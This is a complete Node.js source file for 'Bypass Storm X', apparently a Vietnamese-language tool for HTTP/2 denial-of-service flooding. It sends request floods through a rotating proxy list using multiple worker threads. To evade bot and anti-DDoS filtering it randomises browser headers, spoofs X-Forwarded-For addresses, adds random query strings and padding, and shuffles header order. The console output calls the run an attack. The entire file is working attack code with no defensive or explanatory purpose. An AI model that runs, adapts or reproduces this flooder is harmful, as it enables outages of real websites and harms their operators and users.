const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const { Worker, isMainThread, workerData } = require('worker_threads');
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

const colors = {
    Reset: "\x1b[0m",
    Red: "\x1b[31m",
    Green: "\x1b[32m",
    Yellow: "\x1b[33m",
    Blue: "\x1b[34m",
    Magenta: "\x1b[35m",
    Cyan: "\x1b[36m"
};

tls.DEFAULT_ECDH_CURVE = 'prime256v1';
tls.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256";

const lang_header = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'de-DE,de;q=0.7'];
const encoding_header = ['gzip, deflate, br', 'deflate, gzip'];
const user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
];

if (isMainThread) {
    const args = {
        target: process.argv[2],
        time: ~~process.argv[3],
        rate: ~~process.argv[4],
        threads: ~~process.argv[5],
        proxyFile: process.argv[6],
        query: process.argv.includes('--query') ? process.argv[process.argv.indexOf('--query') + 1] === 'true' : false,
        http2: process.argv.includes('--http') ? (process.argv[process.argv.indexOf('--http') + 1] === '2' && process.argv[process.argv.indexOf('--http') + 2] === 'true') : true
    };
    
    if (process.argv.length < 7 || !fs.existsSync(args.proxyFile)) {
        console.log(`${colors.Red}Cách sử dụng: node bypass-storm-x.js mục_tiêu thời_gian tốc_độ luồng proxy.txt [--query true] [--http 2 true]${colors.Reset}`);
        console.log(`${colors.Red}Lỗi: File proxy không tồn tại hoặc thiếu tham số.${colors.Reset}`);
        process.exit(1);
    }
    
    const proxy = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
    if (proxy.length === 0) {
        console.log(`${colors.Red}Lỗi: File proxy rỗng.${colors.Reset}`);
        process.exit(1);
    }
    
    const parsedTarget = url.parse(args.target);
    const endTime = Date.now() + args.time * 1000;
    
    console.clear();
    console.log(`${colors.Blue}╔════════════════════════════════════╗${colors.Reset}`);
    console.log(`${colors.Blue}║ Bypass Storm X - v2.0 (Optimized)  ║${colors.Reset}`);
    console.log(`${colors.Blue}╠════════════════════════════════════╣${colors.Reset}`);
    console.log(`${colors.Green}║ Mục tiêu: ${parsedTarget.host.padEnd(25)}║${colors.Reset}`);
    console.log(`${colors.Green}║ Thời lượng: ${String(args.time).padEnd(23)}s║${colors.Reset}`);
    console.log(`${colors.Green}║ Tỷ lệ: ${String(args.rate).padEnd(27)}/s║${colors.Reset}`);
    console.log(`${colors.Green}║ Threads: ${String(args.threads).padEnd(24)}║${colors.Reset}`);
    console.log(`${colors.Green}║ Query Random: ${String(args.query).padEnd(21)}║${colors.Reset}`);
    console.log(`${colors.Green}║ HTTP/2: ${String(args.http2).padEnd(25)}║${colors.Reset}`);
    console.log(`${colors.Blue}╚════════════════════════════════════╝${colors.Reset}`);
    
    for (let i = 0; i < args.threads; i++) {
        new Worker(__filename, { workerData: { args, proxy, parsedTarget, endTime } });
    }
    
    let stats = { success: 0, failed: 0, proxyErrors: 0 };
    const statsInterval = setInterval(() => {
        console.log(`${colors.Magenta}╔════ Số liệu thống kê ═════════════════════╗${colors.Reset}`);
        console.log(`${colors.Magenta}║ Thành công: ${String(stats.success).padEnd(20)}║${colors.Reset}`);
        console.log(`${colors.Magenta}║ Không thành công: ${String(stats.failed).padEnd(21)}║${colors.Reset}`);
        console.log(`${colors.Magenta}║ Lỗi proxy: ${String(stats.proxyErrors).padEnd(15)}║${colors.Reset}`);
        console.log(`${colors.Magenta}╚════════════════════════════════╝${colors.Reset}`);
    }, 5000);
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`${colors.Red}Cuộc tấn công đã dừng lại.${colors.Reset}`);
        process.exit(0);
    }, args.time * 1000);
} else {
    const { args, proxy, parsedTarget, endTime } = workerData;
    const proxyPool = proxy.map(p => ({ addr: p, lastUsed: 0, failedAttempts: 0 }));
    let stats = { success: 0, failed: 0, proxyErrors: 0 };
    
    process.setMaxListeners(0);
    require("events").EventEmitter.defaultMaxListeners = 0;
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    function generateRandomHeaders() {
        const headers = {
            ":method": "GET",
            ":path": args.query ? `${parsedTarget.path}/${randomString(8)}?t=${Date.now()}&rnd=${randomString(10)}` : parsedTarget.path,
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "accept": randomElement(["text/html,application/xhtml+xml", "*/*"]),
            "accept-language": randomElement(lang_header),
            "accept-encoding": randomElement(encoding_header),
            "user-agent": randomElement(user_agents),
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="120", "Chromium";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
            "x-requested-with": "XMLHttpRequest",
            "x-time-zone": randomElement(["America/New_York", "Europe/London", "Asia/Tokyo"]),
            "x-random-padding": "X".repeat(randomIntn(50, 200))
        };
        
        const shuffledHeaders = {};
        Object.keys(headers).sort(() => Math.random() - 0.5)
            .forEach(key => shuffledHeaders[key] = headers[key]);
        return shuffledHeaders;
    }
    
    function randomIntn(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }
    
    function randomElement(elements) {
        return elements[randomIntn(0, elements.length)];
    }
    
    function randomString(length) {
        return crypto.randomBytes(length).toString('hex').slice(0, length);
    }
    
    function getNextProxy() {
        const available = proxyPool.filter(p => Date.now() - p.lastUsed > 500 && p.failedAttempts < 5);
        if (available.length === 0) return randomElement(proxyPool).addr;
        const proxy = randomElement(available);
        proxy.lastUsed = Date.now();
        return proxy.addr;
    }
    
    function logDebug(type, message) {
        if (Date.now() > endTime) return;
        if (type === 'error') {
            const timestamp = new Date().toISOString().split("T")[1].split(".")[0];
            console.log(`${colors.Cyan}[${timestamp}]${colors.Reset} ${colors.Red}[LỖI]${colors.Reset} ${message}`);
        } else if (type === 'proxy') {
            const timestamp = new Date().toISOString().split("T")[1].split(".")[0];
            console.log(`${colors.Cyan}[${timestamp}]${colors.Reset} ${colors.Yellow}[PROXY]${colors.Reset} ${message}`);
        } else if (type === 'request') {
            const timestamp = new Date().toISOString().split("T")[1].split(".")[0];
            console.log(`${colors.Cyan}[${timestamp}]${colors.Reset} ${colors.Green}[YÊU CẦU]${colors.Reset} ${message}`);
        }
    }
    
    class NetSocket {
        constructor() {}
        
        HTTP(options, callback) {
            const [proxyHost, proxyPort] = options.proxy.split(":");
            logDebug("proxy", `Đang thử kết nối proxy: ${proxyHost}:${proxyPort}`);
            const connection = net.connect({
                host: proxyHost,
                port: ~~proxyPort,
                allowHalfOpen: true,
                writable: true,
                readable: true,
            });
            
            connection.setTimeout(options.timeout || 1000);
            const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            const buffer = Buffer.from(payload);
            
            connection.on("connect", () => {
                logDebug("proxy", `[${options.proxy}] Đã kết nối TCP, gửi CONNECT...`);
                connection.write(buffer);
            });
            
            connection.on("data", (chunk) => {
                const response = chunk.toString("utf-8");
                logDebug("proxy", `[${options.proxy}] Phản hồi: ${response.substring(0, 50)}...`);
                
                if (response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200")) {
                    logDebug("proxy", `[${options.proxy}] Proxy sẵn sàng, thiết lập TLS...`);
                    const tlsConn = tls.connect({
                        socket: connection,
                        rejectUnauthorized: false,
                        servername: options.address,
                        ALPNProtocols: ["h2", "http/1.1"],
                        ciphers: tls.DEFAULT_CIPHERS,
                        minVersion: "TLSv1.2",
                        handshakeTimeout: 500
                    });
                    
                    tlsConn.on("secureConnect", () => {
                        logDebug("proxy", `[${options.proxy}] TLS thành công`);
                        callback(tlsConn, null);
                    });
                    
                    tlsConn.on("error", (err) => {
                        logDebug("error", `[${options.proxy}] Lỗi TLS: ${err.message}`);
                        connection.destroy();
                        callback(null, `Lỗi TLS: ${err.message}`);
                    });
                } else {
                    connection.destroy();
                    logDebug("error", `[${options.proxy}] Proxy từ chối: ${response.substring(0, 50)}...`);
                    callback(null, "Proxy từ chối");
                }
            });
            
            connection.on("timeout", () => {
                connection.destroy();
                logDebug("error", `[${options.proxy}] Timeout`);
                callback(null, "Timeout");
            });
            
            connection.on("error", (err) => {
                connection.destroy();
                logDebug("error", `[${options.proxy}] Lỗi TCP: ${err.message}`);
                callback(null, `Lỗi TCP: ${err.message}`);
            });
        }
    }
    
    const Header = new NetSocket();
    
    function runFlooder() {
        if (Date.now() > endTime) return;
        
        (async () => {
            await new Promise(resolve => setTimeout(resolve, randomIntn(500, 1500)));
            
            const proxyString = getNextProxy();
            const headers = generateRandomHeaders();
            headers["x-time-zone"] = `TZ=${randomElement(["America/New_York", "Europe/London", "Asia/Tokyo"])}; Expires=${new Date(Date.now() + 3600000).toUTCString()}`;
            
            Header.HTTP({ proxy: proxyString, address: parsedTarget.host, timeout: 1000 }, (tlsConn, error) => {
                if (error) {
                    stats.proxyErrors++;
                    proxyPool.find(p => p.addr === proxyString).failedAttempts++;
                    return setImmediate(runFlooder);
                }
                
                const client = http2.connect(`https://${parsedTarget.host}`, {
                    createConnection: () => tlsConn,
                    settings: { 
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 1048576
                    }
                });
                
                let activeRequests = 0;
                const maxConcurrent = 50000;
                
                function sendRequests() {
                    if (Date.now() > endTime || activeRequests >= maxConcurrent) {
                        return client.close();
                    }
                    
                    activeRequests++;
                    const request = client.request(headers)
                        .on("response", () => {
                            stats.success++;
                            activeRequests--;
                            request.destroy();
                        })
                        .on("error", () => {
                            stats.failed++;
                            activeRequests--;
                        });
                    request.end();
                    
                    setImmediate(sendRequests);
                }
                
                sendRequests();
                
                client.on("close", () => {
                    logDebug('proxy', `Proxy ${proxyString} - Kết nối đóng`);
                });
                
                client.on("error", (err) => {
                    logDebug('error', `Client lỗi - Proxy: ${proxyString} - ${err.message}`);
                    setImmediate(runFlooder);
                });
            });
        })();
    }
    
    const floodInterval = setInterval(() => {
        if (Date.now() <= endTime) runFlooder();
        else clearInterval(floodInterval);
    }, 100);
    
    setTimeout(() => {
        clearInterval(floodInterval);
        logDebug('proxy', 'Worker dừng lại.');
        process.exit(0);
    }, args.time * 1000);
}